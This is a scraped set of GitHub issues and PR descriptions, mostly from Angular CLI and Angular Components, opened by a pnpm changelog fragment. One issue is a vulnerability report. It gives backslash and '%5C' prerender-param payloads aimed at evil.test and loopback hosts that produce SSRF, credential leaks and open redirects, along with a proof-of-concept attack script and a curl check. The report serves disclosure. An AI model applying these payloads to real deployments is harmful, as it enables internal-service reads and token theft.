[pnpm/tasks#208](https://redirect.github.com/pnpm/tasks/issues/208). ##### Adding packages and global packages - `pnpm add @` and `pnpm add @` now install the version the tag or range resolves to, even when the saved range allows a newer one [#​17234](https://redirect.github.com/pnpm/pnpm/issues/17234). - `pnpm add ` without a version now installs the version under the dist-tag set by the `tag` setting. An `npm:` alias or a `jsr:` dependency without a version resolves that tag too. The setting is read from `pnpm-workspace.yaml`, the global config, `PNPM_CONFIG_TAG`, and `--config.tag`, and defaults to `latest`. - `pnpm add` now accepts the lowercase short options `-p`, `-d`, `-o`, and `-e` as aliases of `--save-prod`, `--save-dev`, `--save-optional`, and `--save-exact`. - `pnpm -D install ` now saves the package to devDependencies. An `add` option such as `-D` or `-E` written before `install ` was rejected as an unexpected argument. - `pnpm add -T` now reports that the short option is ambiguous and points to `--save-types` and `--tilde`. - Global packages installed with `pnpm add -g` are now linked from the global virtual store, so global packages that share dependencies share one copy. Set `virtualStoreType: project` to give each global install its own virtual store. - `pnpm add -g` and the other `--global` commands now fail with `ERR_PNPM_CONFIG_CONFLICT_VIRTUAL_STORE_DIR_WITH_GLOBAL` when `--virtual-store-dir` is passed. A custom `--hoist-pattern` fails with `ERR_PNPM_CONFIG_CONFLICT_HOIST_PATTERN_WITH_GLOBAL`. Passing `--link-workspace-packages`, `--shared-workspace-lockfile`, or `--config.lockfile-dir` with `--global` also fails, with the matching `ERR_PNPM_CONFIG_CONFLICT_*_WITH_GLOBAL` code. ##### Registries, proxies, and login - pnpm now reads the `strictSsl` and `localAddress` settings from `pnpm-workspace.yaml`, the global `config.yaml`, `PNPM_CONFIG_*` environment variables, and `--config.*` options. This includes `pnpm self-update` and the download of the pnpm version pinned in `packageManager`. Before, pnpm read them only from `.npmrc` as `strict-ssl` and `local-address` and ignored the other sources [pnpm/tasks#201](https://redirect.github.com/pnpm/tasks/issues/201). - When Corepack runs pnpm and the native binary has to be downloaded, the download now uses the proxy from pnpm's config. That proxy comes from `PNPM_CONFIG_HTTPS_PROXY` and the matching variables, the global `config.yaml`, and the user `.npmrc`. Previously, the download read the proxy only from `HTTPS_PROXY`, `HTTP_PROXY`, and `NO_PROXY` [pnpm/tasks#215](https://redirect.github.com/pnpm/tasks/issues/215). - When the `pnpm` package downloads its native binary on first run, as it does under Corepack, it now trusts the CA certificates from the `ca`, `ca[]`, and `cafile` settings of `.npmrc`, including the ones scoped to the registry. A registry behind a private CA failed with `fetch failed` before, unless `NODE_EXTRA_CA_CERTS` named the CA. A project `.npmrc` is used only while the download is checked against npm's signature. Node.js versions that cannot add CA certificates after startup still need `NODE_EXTRA_CA_CERTS`. - `pnpm login` saves the token in `/auth.ini` again. Since v12.1.0, an unscoped login had made its registry the default for every project that did not name a registry. A login now also removes the token an earlier login saved for that registry or scope under `_auth` in the global `config.yaml`. `pnpm login --scope` still routes the scope through the global `registries` setting. - pnpm no longer warns that a `registries` entry routed through the `@` scope matches no configured registry. pnpm applied such an entry and its options such as `serverType` while reporting it as ignored [pnpm/tasks#184](https://redirect.github.com/pnpm/tasks/issues/184). ##### Running scripts and other commands - `pnpm ci --lockfile` and `pnpm ci --config.lockfile=true` no longer delete `pnpm-lock.yaml`. `pnpm ci` now always keeps the lockfile and runs a frozen install from it. - `pnpm deploy --legacy` now checks the workspace lockfile against `minimumReleaseAge` and the other resolution policies, as `pnpm install` does, and fails with `ERR_PNPM_MINIMUM_RELEASE_AGE_VIOLATION` when a locked version is too new. It used to deploy an older version that is not in the lockfile without a warning [#​17209](https://redirect.github.com/pnpm/pnpm/issues/17209). - `pnpm deploy` now keeps a deployed symlink to a directory inside the project even if the directory is not among the deployed files, such as a link into `node_modules` [#​17288](https://redirect.github.com/pnpm/pnpm/issues/17288). - `pnpm pack` and `pnpm publish` now keep `pnpm.config` in the published `package.json`. They also always include the file `pnpm.config` points to in the tarball [#​17210](https://redirect.github.com/pnpm/pnpm/issues/17210). - `pnpm -r publish --batch` now sends `PUT /-/pnpr/v0/publish`, the batch publish endpoint that pnpr serves. - `pnpm audit --ignore` and `pnpm audit --ignore-unfixable` now exit with a non-zero code when vulnerabilities at or above the audit level remain after ignoring. Before, these commands always exited with code 0. - `pnpm audit --fix` and `pnpm audit --interactive` now fail with `ERR_PNPM_AUDIT_FIX_WITH_IGNORE` when combined with `--ignore` or `--ignore-unfixable`. Before, the fix ran and the ignore flags had no effect. - `pnpm -r run

Issues.Title: ci: enable runfiles when cross-building Windows E2E tests
Issues.Body:
When cross-building the Windows E2E targets on Linux with `--platforms=tools:windows_x64`, `@bazel_lib//lib:enable_runfiles` evaluates to `False` unless `--enable_runfiles` is passed, causing `aspect_rules_js` to generate the test launcher script with `JS_BINARY__NO_RUNFILES=1`.

In `aspect_rules_js` 3.5.2 (see #34578), `JS_BINARY__NO_RUNFILES=1` resolves the entry point using `JS_BINARY__BINDIR` (`bazel-out/k8-fastbuild/bin`) instead of `BAZEL_BINDIR` (`.`), which fails on Windows CI where the tests are executed from the built `.runfiles` directory tree. Passing `--enable_runfiles` during the Windows E2E cross-build ensures the launcher script resolves the entry point from the runfiles directory.
Issues.RelatedDescription: Closed or merged PR "ci: enable runfiles when cross-building Windows E2E tests" (#34584)

Issues.Title: fix(@angular/build): include source map hashes in optimized chunk hashes
Issues.Body:
When `sourceMap.scripts` is enabled, `injectDebugIds` appends a `//# debugId=<uuid>` comment derived from the chunk's source map content to each emitted browser JS file after chunk optimization.

While esbuild includes source map content when computing output chunk hashes, `optimizeChunks` strips the esbuild hash and relies on Rolldown to compute `[hash]` for optimized chunks. Because Rolldown only hashed the JS code and not the input source maps, a source change that only altered the source map (such as adding or removing type definitions or comments that shifted line numbers) changed the `debugId` bytes in the emitted JS file and its SRI hash in `index.html` without changing the chunk's filename.

Implement `augmentChunkHash` in the chunk optimizer's `angular-bundle` plugin to include the input source map hashes when source maps are enabled, and invalidate cached `BuildOutputFile` hashes when `contents` are mutated.

Closes #34574

Issues.Title: fix(@angular/ssr): destroy platform when request is aborted during rendering
Issues.Body:
Previously, aborting `request.signal` during server-side rendering caused `AngularServerApp.handle()` to reject via `promiseWithAbort`, while `renderAngular()` continued running in the background until `whenStable()` completed (or leaked the platform if a pending task never resolved).

This commit forwards `request.signal` into `renderAngular()` so that aborting an in-flight request destroys the underlying `PlatformRef`, cancels any pending render timer, and exits cleanly. Additionally, `promiseWithAbort()` now attaches rejection handlers to the underlying promise even when the signal is already aborted to avoid unhandled promise rejections.

Closes #34567
Issues.RelatedDescription: Closed or merged PR "fix(@angular/ssr): destroy platform when request is aborted during rendering" (#34568)

Issues.Title: fix(@angular/build): copy assets replaced by a rename in watch mode
Issues.Body:
When an asset is replaced by renaming another file over it, as editors with atomic save do, the native file watcher on Linux reports the asset as added instead of modified. The incremental build only copied existing assets that were reported as modified, so the output kept the previous contents of the asset.

Existing assets reported as added are now copied as well. The new spec disables polling so that the native watcher is used.
Issues.RelatedDescription: Open PR "fix(@angular/build): copy assets replaced by a rename in watch mode" (#34575)

Issues.Body: Clarify in `SECURITY.md` that build-time configuration and values returned by developer-authored build-time functions (such as `getPrerenderParams()`) are trusted inputs.

Issues.Title: Debug ID changes the bytes of an optimized chunk but not its file name, so cached files fail the SRI check
Issues.Body:
### Command

build

### Is this a regression?

- [x] Yes, this behavior used to work in the previous version

### The previous version in which this bug was not present was

22.0.x

### Description

Since 22.1.0 (#33110), the application builder adds a `//# debugId=<uuid>` line to each browser JS file when script source maps are enabled. The ID comes from the bytes of the source map.

When the chunk optimizer runs (by default when the build has 3 or more lazy chunks), Rolldown gives the chunks their final file names. The `[hash]` in these names covers the code of the chunk only. It does not cover the source map. The debugId line is added after that.

A change that keeps the JS code of a chunk the same but changes its source map (for example, a change to a TypeScript type or to a comment) gives this result for a chunk that does not import other chunks:

1. The file name stays the same.
2. The debugId changes, because the source map changed.
3. The file bytes change, because the debugId line changed.
4. The SRI hash in `index.html` changes to match the new bytes.

In one build, the HTML and the files match. Across two builds, the rule "same hashed file name means same content" is no longer true.

Hosting setups depend on this rule: they cache hashed files as immutable. Any cache can keep the file from the previous build: a CDN such as Cloudflare, the browser cache, or a proxy. That cache then serves the old bytes together with the new `index.html`. The integrity check fails, the browser blocks the file, and the modules in it do not load.

Before 22.1.0 there was no debugId line, so the bytes of a hashed file changed only when its name changed.

**Expected behavior:** if the bytes of a hashed output file change, its file name changes too.

### Minimal Reproduction

Repository: https://github.com/virgiliojr/angular-debugid-sri-repro

The app is a plain `ng new` app (Angular CLI 22.2.2) with 3 lazy routes, so the chunk optimizer runs. `lazy-a` and `lazy-b` use `src/app/shared/label.ts`. This module has no imports, so it becomes its own chunk.

1. Run `npm ci`.
2. Run `npx ng build --source-map --subresource-integrity`.
3. In `dist/repro/browser/`, find the chunk that contains `label:`. Write down its file name and its SHA-384.
4. In `src/app/shared/label.ts`, add `extra?: number;` to the `LabelInput` interface. This is a type-only change: the JS output of `label.ts` stays the same.
5. Run `npx ng build --source-map --subresource-integrity` again.
6. Find the chunk that contains `label:` again.

`bash compare-builds.sh` in the repository does steps 2 to 6 and prints the result below.

**Actual result:**

```text
Build 1
  file name:          chunk-z-ytF2G0.js
  sha384 of bytes:    sha384-Y7f5K4V0FTCrXc6JQ2tGE+VllRWg501EixeFEPMjNMboDgwfeRc9E6l8oHlqTbX5
  debugId line:       //# debugId=105cedd6-2603-584f-8e8d-7801d6020b96
  sha in index.html:  yes
Build 2
  file name:          chunk-z-ytF2G0.js
  sha384 of bytes:    sha384-bgCbCJmJexbhKCHeS4kpofe2lKBPWJ1f3JpK9668+/jD2mfiEYADUy5xD1Usr1dZ
  debugId line:       //# debugId=9c547775-c029-5af8-ba7e-25c70949f1b6
  sha in index.html:  yes

Diff of the chunk between the two builds:
2c2
< //# debugId=105cedd6-2603-584f-8e8d-7801d6020b96
---
> //# debugId=9c547775-c029-5af8-ba7e-25c70949f1b6
```

The file name is the same, but the bytes and the SRI hash in `index.html` are different.

**Expected result:** if the bytes are different, the file name is different too.

To see the failure in a browser, serve the output of build 2, but serve `chunk-z-ytF2G0.js` from build 1. This is what a cache does after a deployment.

### Exception or Error

```text
Failed to find a valid digest in the 'integrity' attribute for resource 'https://<host>/chunk-z-ytF2G0.js' with computed SHA-384 integrity '<hash>'. The resource has been blocked.
```

### Your Environment

```text
Angular CLI       : 22.2.5
Angular           : 22.2.3
Node.js           : 24.18.0
Package Manager   : npm 11.16.0
Operating System  : darwin arm64

┌───────────────────────────┬───────────────────┬───────────────────┐
│ Package                   │ Installed Version │ Requested Version │
├───────────────────────────┼───────────────────┼───────────────────┤
│ @angular/build            │ 22.2.5            │ ^22.2.2           │
│ @angular/cli              │ 22.2.5            │ ^22.2.2           │
│ @angular/common           │ 22.2.3            │ ^22.2.0           │
│ @angular/compiler         │ 22.2.3            │ ^22.2.0           │
│ @angular/compiler-cli     │ 22.2.3            │ ^22.2.0           │
│ @angular/core             │ 22.2.3            │ ^22.2.0           │
│ @angular/forms            │ 22.2.3            │ ^22.2.0           │
│ @angular/platform-browser │ 22.2.3            │ ^22.2.0           │
│ @angular/router           │ 22.2.3            │ ^22.2.0           │
│ rxjs                      │ 7.8.2             │ ~7.8.0            │
│ typescript                │ 6.0.3             │ ~6.0.2            │
└───────────────────────────┴───────────────────┴───────────────────┘
```

### Anything else relevant?

This does not depend on the browser. Any cache in front of the hashed files can cause it.

The defect needs the chunk optimizer. With `NG_BUILD_OPTIMIZE_CHUNKS=false`, the same type change gives a new esbuild file name for the chunk (for example `chunk-P54LQIKA.js` to `chunk-5HS55H7R.js`), so the name and the bytes change together.

A chunk that imports other chunks usually gets a new name anyway, because the names of the chunks it imports change. A chunk without such imports keeps its name.

Related: #33108, #33110, #33572. The current `main` still has this behavior: `injectDebugIds` (called from `execute-post-bundle.ts` when `sourcemapOptions.scripts` is true) changes the file contents but does not change the file name. The Rolldown pass in `chunk-optimizer.ts` uses `chunkFileNames: '<name>-[hash].js'`.
Issues.RelatedDescription: Open issue "Debug ID changes the bytes of an optimized chunk but not its file name, so cached files fail the SRI check" (#34574)

Issues.Title: Angular SSR prerender params allow build-time SSRF, credential leaks, and open redirects
Issues.Body:
### Command

other

### Is this a regression?

- [ ] Yes, this behavior used to work in the previous version

### The previous version in which this bug was not present was

_No response_

### Description


This is the part of #34474 that escaping doesn't reach. 22.2.5 ships both fixes from that issue, and a `getPrerenderParams()` value that starts with `\` still leaves the application's origin twice: while `ng build` renders the page, and in the redirect it ships.

`handlePrerenderParamsReplacement` only checks the type ([`ng-routes.ts#L553-L570`](https://github.com/angular/angular-cli/blob/v22.2.5/packages/angular/ssr/src/routes/ng-routes.ts#L553-L570)):

```ts
if (typeof value !== 'string') {
  throw new Error(/* ... */);
}

return parameterName === '**' ? `/${value}` : value;
```

So `\cdn-login.test` becomes the route `/\cdn-login.test`. As a path it looks harmless, but for `http:` the URL parser reads `\` as `/`, so the route is `//cdn-login.test`, another host. Two places use the route as a URL:

- `renderPage` builds the render request with `new Request(new URL(url, serverURL))` ([`render-worker.ts#L54`](https://github.com/angular/angular-cli/blob/v22.2.5/packages/angular/build/src/utils/server-rendering/render-worker.ts#L54)), so the page renders with that host as its origin, and every relative `HttpClient` call made during the render goes there.
- The resolved `redirectTo` goes into the generated redirect page ([`prerender.ts#L258`](https://github.com/angular/angular-cli/blob/v22.2.5/packages/angular/build/src/utils/server-rendering/prerender.ts#L258)), or into `Location` with `outputMode: 'server'`.

Those values are application data, the docs read them from a service:

```ts
const ids = await dataService.getIds();
return ids.map((id) => ({ id }));
```

So whoever can write one row, through a public signup or as a CMS author, picks where the build connects and where visitors land. The product in the repro validates both inputs (no whitespace, no raw `\`, no `..`) and these still pass, because `RouteTree.getPathSegments` percent-decodes each segment afterwards ([`route-tree.ts#L212-L213`](https://github.com/angular/angular-cli/blob/v22.2.5/packages/angular/ssr/src/routes/route-tree.ts#L212-L213)). One value is enough:

| Value                               | Entered through               | Result                                                                                   |
| ----------------------------------- | ----------------------------- | ---------------------------------------------------------------------------------------- |
| `\cdn-login.test`                   | workspace slug, public signup | `/%5Ccdn-login.test` redirects to `cdn-login.test`                                       |
| `%5C127.0.0.2/docs/getting-started` | CMS page path                 | the build reads an internal-only service and publishes the response                      |
| `%5C127.0.0.1:8787/%2E%2E`          | CMS page path                 | the platform credentials go to `127.0.0.1:8787`, and the site's `index.html` is replaced |
| `%5Cevil.test/docs/getting-started` | CMS page path                 | the build sends a request to `evil.test`                                                 |

`ng build` exits 0 with no warning for all of them.

**1. Open redirect.** Each workspace gets a vanity URL that lands on its home page:

```ts
{ path: ':workspace', children: [
  { path: '', pathMatch: 'full', redirectTo: 'home' },
  { path: 'home', component: WorkspacePage },
]},
```

With the slug `\cdn-login.test` the build writes this redirect page:

```html
<meta http-equiv="refresh" content="0; url=/\cdn-login.test/home" />
```

In Chrome, `http://status.statuslane.test/%5Ccdn-login.test` ends on `http://cdn-login.test/home`. The link has no `@`, no second scheme and no `//`. `escapeHtml` leaves the target as it is, since there's nothing in it to escape.

**2. Reading an internal service.** Docs pages load their body in a resolver, over a relative URL:

```ts
inject(HttpClient).get(`/api/content/${path}`, { responseType: 'text' });
```

With the page path `%5C127.0.0.2/docs/getting-started` the page renders at `http://127.0.0.2`, so the build fetches `http://127.0.0.2/api/content/docs/getting-started`, a service only the CI network can reach. Its response, database URL included, is written into the published page and into `ng-state`. The attacker never needs an inbound connection, the response comes back through the site. The tail has to name a route that exists, otherwise the build fails with `The content returned was empty.`

**3. Credentials to another host.** The home page calls the internal API or/and an interceptor adds the platform token only to relative URLs, which is the usual guard:

```ts
if (!req.url.startsWith('/api/internal/')) {
  return next(req);
}
return next(
  req.clone({
    setHeaders: { authorization, 'x-api-key': apiKey, cookie, 'x-ci-deploy-token': ciToken },
  }),
);
```

With `%5C127.0.0.1:8787/%2E%2E` the URL is still relative when the interceptor runs and the origin is applied later, so all four headers arrive at `127.0.0.1:8787`. `%2E%2E` consumes the host segment when `posix.join` computes the output path ([`prerender.ts#L462`](https://github.com/angular/angular-cli/blob/v22.2.5/packages/angular/build/src/utils/server-rendering/prerender.ts#L462)), so the page is written over the site's own `index.html` and `dist` has no odd file name. That write races the real home page: 1 of 3 builds at 0 ms, 3 of 3 when the listener answers after 1500 ms. The credentials go out every time.

**4. `allowedHosts` isn't consulted.** The app sets `security.allowedHosts: ["localhost"]`, none of the hosts above is on it, and the build went to all of them. A DNS name works the same. With the page path `%5Cevil.test/docs/getting-started` the page renders at `http://evil.test`, and its request only fails because `.test` doesn't resolve:

```text
evil.test/docs/getting-started/index.html
    origin   http://evil.test
    content  "unavailable (Http failure response for http://evil.test/api/c)"
```

A name the attacker owns would connect. The page gets that origin even though nothing answered, because the origin is set before any request is made. `allowedHosts` only decides which `Host` headers the running server answers. A filter on the raw value doesn't help either, since `%5C` is decoded later.

### Minimal Reproduction


Repository: https://github.com/SkyZeroZx/angular-cli-prerender-param-ssrf-poc

There the values arrive over HTTP from the application's own API, through a public signup and a CMS author token. Every host is on loopback.

```bash
npm ci
npm run attack
npm run browser
```

```text
build              exit 0, prerendered 12, warnings 0
allowedHosts       ["localhost"] (angular.json)
  P1 signup "\cdn-login.test"                          accepted                     landed
  P2 cms    "%5C127.0.0.2/docs/getting-started"        accepted                     landed
  P3 cms    "%5C127.0.0.1:8787/%2E%2E"                 accepted                     landed
  P4 cms    "%5Cevil.test/docs/getting-started"        accepted                     landed
  [attacker] GET /api/internal/metrics  Host=127.0.0.1:8787  UA=node  (not in allowedHosts)
  [internal] GET /api/content/docs/getting-started  Host=127.0.0.2  UA=node  (not in allowedHosts)
```

Without the lab, one route and one value:

```ts
// app.routes.ts
export const routes: Routes = [
  {
    path: ':tenant',
    children: [
      { path: '', redirectTo: 'home', pathMatch: 'full' },
      { path: 'home', component: Page },
    ],
  },
  { path: '**', component: Page },
];

// app.routes.server.ts
export const serverRoutes: ServerRoute[] = [
  {
    path: ':tenant',
    renderMode: RenderMode.Prerender,
    getPrerenderParams: async () => [{ tenant: '\\evil.test' }],
  },
  { path: '**', renderMode: RenderMode.Client },
];
```

```bash
ng build
NG_ALLOWED_HOSTS=localhost PORT=4000 node dist/<app>/server/server.mjs &
curl -s -o /dev/null -D - http://localhost:4000/%5Cevil.test | grep -i location
```

```text
location: /\evil.test/home
```

With `--output-mode=static` the same value writes a redirect page with the same target.

### Exception or Error

```text

```

### Your Environment

```text
Angular CLI 22.2.5
@angular/build 22.2.5
@angular/ssr 22.2.5
@angular/core 22.2.3
Node.js 24.16.0
npm 11.13.0
Windows 11 x64
Chrome 156
```

### Anything else relevant?

_No response_

Issues.Title: feat(cdk Portal): Allow DomPortal to reference detached elements
Issues.Body:
### Feature Description

There is a built-in security that blocks a detached element (one that has no parent node) to be used in a DomPortal, [here](https://github.com/angular/components/blob/265b8a48718fda931ef6c57b30b371fcd926707b/src/cdk/portal/dom-portal-outlet.ts#L145).
The only purpose of this bit of code is to ensure that _if_ the DOM node is obtained the nominal way, i.e from the component's view, then it gets put back where it was before, when the operation is done or it stops being used.

### Use Case

I have a dependency that generates DOM nodes (SVG nodes to be precise). I was using a custom directive that was using `inject(ElementRef).nativeElement` and `.replaceChildren(this.inputDOMNode())`, which works but is not great.

I discovered Portal and thought I could use it, but I actually can't because the built-in security prevents me from passing a detached element to DOMPortal(). I guess I could instanciate a dummy DOM node (itself detached) to attach all my SVG nodes to it before passing them to the DOMPortal, but that's nonsense really, I just don't need the housekeeping feature of placing the node back where it was found.
Issues.RelatedDescription: Open issue "feat(cdk Portal): Allow DomPortal to reference detached elements" (#34023)

Issues.Title: feat(Paginator): Fix the default "1 – 10 of 100" syntax
Issues.Body:
### Feature Description

By default, [Paginator](https://material.angular.dev/components/paginator/overview) shows text like "1 – 10 of 100". The space around the en-dash is incorrect syntax. There is no style guide that uses that. Even British style guides, e.g., [New Hart's Rules: The Oxford Style Guide](https://oceanide.es/losarchivos/docs/new-harts-rules-2005.pdf), which use spaces around en-dashes in some situations, don't use it for ranges.

The correct text should be "1–10 of 100".

### Use Case

While this can be replaced through `MatPaginatorIntl`, the default English label should also be correct for projects that do not need i18n. I know this is a "breaking change" as it might break screenshot and text-based tests, but it can be done for a major release.
Issues.RelatedDescription: Closed issue "feat(Paginator): Fix the default "1 – 10 of 100" syntax" (#34021)

Issues.Title: feat(Paginator): Option to hide the navigation when there is a single page
Issues.Body:
### Feature Description

The [Paginator](https://material.angular.dev/components/paginator/overview) shows the navigation buttons even when there is only a single page. They are just disabled. If I want to hide the buttons in that case, I would have to target the internal `mat-mdc-paginator-navigation-*` classes, which are not public API.

### Use Case

Hiding the disabled navigation buttons but keeping the useful text that shows how many rows there are
Issues.RelatedDescription: Open issue "feat(Paginator): Option to hide the navigation when there is a single page" (#34022)

Issues.Title: bug(material/datepicker): Focus moves to a date cell instead of returning to the period button after selecting a year/month (WCAG 2.4.3)
Issues.Body:
### Is this a regression?

No, this behaviour has always existed.

### Description

When the calendar’s period button (“Choose month and year”) is activated by keyboard, the calendar switches to the multi-year view and then the year view. After the user selects a year and then a month, the calendar returns to the month view and focus moves to a date cell in the calendar grid. It does not return to the period button that opened the view.

This affects keyboard and screen reader users. They can’t easily change the month or year again, because the next Tab or Shift+Tab stop is unpredictable. They have to navigate back through the grid to reach the period button. We believe this fails WCAG 2.2 SC 2.4.3 (Focus Order) in accessibility audits, because the focus destination after the interaction doesn’t preserve a logical, predictable order relative to the control that triggered it.

### Reproduction

This reproduces on the official Angular Material documentation example: https://material.angular.dev/components/datepicker/overview#datepicker-custom-icon

Steps to reproduce (keyboard only):
1.Open the datepicker with the “Open calendar” button (Enter).
2.Press Tab until the “Choose month and year” period button is focused, then press Enter.
3.Use the arrow keys to select a year and press Enter.
4.Use the arrow keys to select a month and press Enter.
5.Observe where focus lands.


### Expected Behavior

Focus returns to the period button that opened the view, so users can change the month/year again or Tab onward predictably. Alternatively, expose an option to control this, for example an input on mat-calendar.

### Actual Behavior

Focus moves to a date cell (.mat-calendar-body-cell) in the month grid. The period button loses focus and the user has to navigate back to it manually.

### Environment

- Angular: 19.2.14
- CDK/Material: 19.2.19
- Browser(s): Chrome, Safari
- Operating System : macOS
Issues.RelatedDescription: Closed issue "bug(material/datepicker): Focus moves to a date cell instead of returning to the period button after selecting a year/month (WCAG 2.4.3)" (#34013)

Issues.Title: Feature (MatDialog): Add an option to prevent duplicate dialogs
Issues.Body:
### Feature Description

Currently, Angular Material’s MatDialog allows the same component to be opened multiple times, resulting in multiple instances of the same dialog being displayed simultaneously.

In some applications, this behavior is undesirable. For example, repeated user interactions or multiple event emissions can accidentally open the same dialog more than once.

Developers must currently implement their own duplicate detection logic using MatDialog.openDialogs or MatDialog.getDialogById() before calling MatDialog.open().

Proposed solution

It would be useful to have a built-in option in MatDialogConfig to prevent duplicate instances of the same component from being opened.

For example:

this.dialog.open(MyDialogComponent, {
  preventDuplicates: true,
});

When this option is enabled, attempting to open a component that already has an open dialog could either:

* Return the existing MatDialogRef without creating another instance.
* Ignore the new request and keep the existing dialog open.

The exact behavior could be determined by the maintainers.

Ideally, duplicate detection would be scoped to the component type, with an option to customize the behavior if needed.

Benefits

* Avoids accidentally opening multiple instances of the same dialog.
* Reduces repetitive boilerplate across applications.
* Provides a consistent, framework-level solution.
* Keeps applications simpler and less error-prone.

Alternatives considered

Currently, developers can manually inspect openDialogs or use getDialogById() before opening a dialog. However, this requires additional application-level logic and does not provide a straightforward, reusable option for this common use case.

Would this feature be a good fit for Angular Material’s MatDialog API? I’d be happy to contribute a PR if the maintainers consider this approach appropriate.

### Use Case

_No response_

Issues.Title: bug(aria/accordion): Enter/Space inside a panel toggles the accordion instead of activating the focused element
Issues.Body:
### Is this a regression?

- [ ] Yes, this behavior used to work in the previous version

### The previous version in which this bug was not present was

_No response_

### Description

Pressing Enter on a link (or Space on a button) inside an expanded `ngAccordionPanel` collapses the panel instead of activating the link/button.

`ngAccordionGroup` handles `keydown` for the whole group, including panel content, and calls `preventDefault()` on Enter/Space, so the focused element never gets activated. Arrow keys and Home/End are affected too, e.g. Home in an input inside a panel moves focus to the trigger.

The click handler only reacts to events coming from a trigger (`_findTriggerPattern`), the keydown handler doesn't check that:
https://github.com/angular/components/blob/952685f9370ba718f832d745512db7c9a04e1bcd/src/aria/private/accordion/accordion.ts#L73-L97

### Reproduction

StackBlitz link: https://stackblitz.com/edit/z5sxyaq6?file=src%2Fmain.ts

Steps to reproduce:
1. Expand "Section 1".
2. Tab to "Link inside panel" or "Button inside panel" and press Enter / Space.
3. Expand it again, click into the input and press Home.

### Expected Behavior

The link/button is activated (shows up in the log) and the panel stays open. Home moves the caret in the input.

### Actual Behavior

The panel collapses, nothing is activated. Home moves focus to the trigger.

### Environment

- Angular: 22.2.3
- CDK/Material: @angular/aria 22.2.4 (also 22.1.6)
- Browser(s): Chrome 155
- Operating System (e.g. Windows, macOS, Ubuntu): Linux
Issues.RelatedDescription: Open issue "bug(aria/accordion): Enter/Space inside a panel toggles the accordion instead of activating the focused element" (#34011)

Issues.Title: build: guard branch-manager against forks and harden checkout
Issues.Body:
This change restores `if: github.event.repository.fork == false` on `.github/workflows/assistant-to-the-branch-manager.yml` on the `22.2.x` branch per GHSS `pull_request_target` policy remediation (b/577107676).

Because 100% of pull requests in `angular/components` originate from forks (`only_allow_releasable_branches: true`) and `branch-manager` requires `context.eventName === 'pull_request_target'` along with `secrets.ANGULAR_ROBOT_PRIVATE_KEY` to set mergeability commit status, the previous `head.repo.fork == false` check caused all fork PR runs to be skipped. Restoring the base repository fork check ensures branch-manager triggers as intended on upstream PRs while preventing runs on external forks.

Additionally, `persist-credentials: false` is added to `actions/checkout` in `.github/workflows/google-internal-tests.yml` for defense-in-depth.
Issues.RelatedDescription: Closed or merged PR "build: guard branch-manager against forks and harden checkout" (#34007)

Issues.Title: bug(ClickEventManager): Clicks on iOS 18.2 and before do not have pointer type
Issues.Body:
### Is this a regression?

- [ ] Yes, this behavior used to work in the previous version

### The previous version in which this bug was not present was

_No response_

### Description

I found this problem using the listbox component, but I am pretty sure all components that use the ClickEventManager have this problem. iOS versions older than 18.2 do not have a pointer type, the ClickEventManager sees these as fake clicks (see isFakeClick function) and ignores them, so clicks do not work.

See release notes about the pointer type.
https://webkit.org/blog/16301/webkit-features-in-safari-18-2/

### Reproduction

Can be reproduced on https://angular.dev with a iOS version older than 18.2, with multiple components for example on https://angular.dev/guide/aria/select.

### Expected Behavior

Clicks in components handeld via ClickEventManager on iOS version older than 18.2 should work.

### Actual Behavior

Clicks in components handled via ClickEventManager on iOS version older than 18.2 do not work.

### Environment

- Angular: 22.2.3
- CDK/Material: 22.2.3
- Operating System (e.g. Windows, macOS, Ubuntu): iOS version older than 18.2
Issues.RelatedDescription: Closed issue "bug(ClickEventManager): Clicks on iOS 18.2 and before do not have pointer type" (#33999)

Issues.Title: docs(cdk/scrolling): explain how to react to scroll events
Issues.Body:
Adds a section to the scrolling overview that shows how to listen to scroll events with `cdkScrollable` and the `ScrollDispatcher`, along with a live example.

Fixes #9594 
The scrolling overview only had two short paragraphs about `cdkScrollable` and `ScrollDispatcher` and didn't show how to actually listen to scroll events. This adds:

- a section on `elementScrolled`, `scrolled` and `ancestorScrolled`, with a snippet
- a live example (`cdk-scrollable-overview`) that shows the scroll offset and scrolls back to the top
- a note that the events fire outside the Angular zone, so the view only updates if you use signals or `markForCheck`
